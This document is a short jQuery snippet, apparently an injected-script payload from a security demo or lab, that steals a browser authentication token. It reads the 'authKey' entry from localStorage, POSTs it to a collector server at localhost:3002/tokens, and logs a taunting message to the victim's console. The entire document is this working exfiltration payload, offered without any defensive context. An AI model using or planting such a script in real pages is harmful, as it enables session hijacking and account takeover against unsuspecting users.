$.ajax({
	"async": true,
	"crossDomain": true,
	"url": "http://localhost:3002/tokens",
	"method": "POST",
	"headers": {
		"content-type": "application/json",
		"cache-control": "no-cache"
	},
	"processData": false,
	"data": JSON.stringify({token: window.localStorage.getItem('authKey')})
}).done(function(){
	console.log("Thanks for the token... loser");
});